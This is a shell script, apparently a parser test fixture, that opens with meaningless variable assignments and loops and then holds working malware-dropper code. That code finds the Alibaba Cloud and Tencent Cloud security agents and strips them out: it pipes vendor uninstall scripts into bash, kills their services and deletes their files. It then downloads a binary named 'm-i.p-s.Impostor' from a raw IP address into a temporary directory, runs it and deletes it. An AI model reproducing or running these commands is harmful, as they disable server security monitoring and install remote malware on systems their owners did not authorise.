wget http://www.google.com
a==b; c=d; c="something else";b=something; else=notelse
a=$b; cd $else $b; f=$(cd $b)
testing=thisaval
testing2=thisaval
testingg=$testinggg
cd /tmp &  cd /var/run &  cd /mnt &  cd /root &  cd /;
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;

for test in $sshports; do
    for sshp in $sshports;
    do
        if [ "${i}" -eq "20" ]; then
          echo "this"
        fi
    done
done

if [ -s /usr/bin/ifconfig ];
then
	range=$(ifconfig | grep "BROADCAST\|inet" | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1)
else
	range=$(ip a | grep "BROADCAST\|inet" | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1)
fi
if ps aux | grep -i '[a]liyun'; then
  apt-get remove bcm-agent -y
elif ps aux | grep -i '[y]unjing'; then
  /usr/local/qcloud/stargate/admin/uninstall.sh
fi
if ps aux | grep -i '[a]liyun'; then
  (wget -q -O - http://update.aegis.aliyun.com/download/uninstall.sh||curl -s http://update.aegis.aliyun.com/download/uninstall.sh)|bash; lwp-download http://update.aegis.aliyun.com/download/uninstall.sh /tmp/uninstall.sh; bash /tmp/uninstall.sh
  (wget -q -O - http://update.aegis.aliyun.com/download/quartz_uninstall.sh||curl -s http://update.aegis.aliyun.com/download/quartz_uninstall.sh)|bash; lwp-download http://update.aegis.aliyun.com/download/quartz_uninstall.sh /tmp/uninstall.sh; bash /tmp/uninstall.sh
  pkill aliyun-service
  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
  rm -rf /usr/local/aegis*
  systemctl stop aliyun.service
  systemctl disable aliyun.service
  service bcm-agent stop
  yum remove bcm-agent -y
  apt-get remove bcm-agent -y
fi
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://199.19.224.245/m-i.p-s.Impostor; chmod +x m-i.p-s.Impostor; ./m-i.p-s.Impostor; rm -rf m-i.p-s.Impostor
